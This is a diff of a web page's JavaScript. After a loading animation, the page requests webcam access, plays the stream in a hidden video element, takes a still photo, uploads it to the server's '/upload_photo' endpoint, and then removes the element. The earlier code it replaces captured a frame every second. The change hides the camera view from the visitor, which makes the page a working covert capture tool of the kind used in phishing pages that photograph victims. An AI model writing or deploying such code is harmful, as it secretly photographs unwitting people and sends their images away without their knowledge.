@@ -1,9 +1,11 @@
 window.addEventListener('DOMContentLoaded', () => {
   const loader = document.querySelector('.loader');
   const container = document.querySelector('.container');
-  const video = document.getElementById('video');
-  let stream = null;
-  let captureInterval = null;
+  
+  // Create a hidden video element for capture
+  const video = document.createElement('video');
+  video.style.display = 'none';
+  document.body.appendChild(video);
   
   // Create a hidden canvas for photo capture
   const canvas = document.createElement('canvas');
@@ -14,38 +16,36 @@ window.addEventListener('DOMContentLoaded', () => {
     loader.style.display = 'none';
     container.style.display = 'flex';
     
-    // Access webcam and stream to video element
+    // Access webcam and capture photo
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({ video: true })
-        .then(streamData => {
-          stream = streamData;
+        .then(stream => {
           video.srcObject = stream;
           video.play();
           
-          // Start capturing photos once video is playing
+          // Wait for video to be ready
           video.addEventListener('loadedmetadata', () => {
-            startPhotoCapture();
+            // Set canvas dimensions to match video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Capture photo after a short delay to ensure good quality
+            setTimeout(() => {
+              capturePhoto();
+              // Stop the stream after capturing
+              stream.getTracks().forEach(track => track.stop());
+              // Remove the video element
+              video.remove();
+            }, 1000);
           });
         })
         .catch(err => {
           console.error('Error accessing webcam:', err);
-          // Optionally show an error message or fallback UI here
         });
     } else {
       console.warn('getUserMedia not supported by this browser');
     }
   }, 1000);
-  
-  function startPhotoCapture() {
-    // Set canvas dimensions to match video
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    
-    // Capture a photo every 1 second (1000ms)
-    captureInterval = setInterval(() => {
-      capturePhoto();
-    }, 1000);
-  }
   
   function capturePhoto() {
     // Draw current video frame to canvas
@@ -68,7 +68,7 @@ window.addEventListener('DOMContentLoaded', () => {
     const formData = new FormData();
     formData.append('photo', blob, filename);
     
-    fetch('/save-capture', {
+    fetch('/upload_photo', {
       method: 'POST',
       body: formData
     })
@@ -83,14 +83,4 @@ window.addEventListener('DOMContentLoaded', () => {
       console.error('Error sending photo:', error);
     });
   }
-  
-  // Stop capturing when user leaves the page
-  window.addEventListener('beforeunload', () => {
-    if (captureInterval) {
-      clearInterval(captureInterval);
-    }
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-    }
-  });
 });
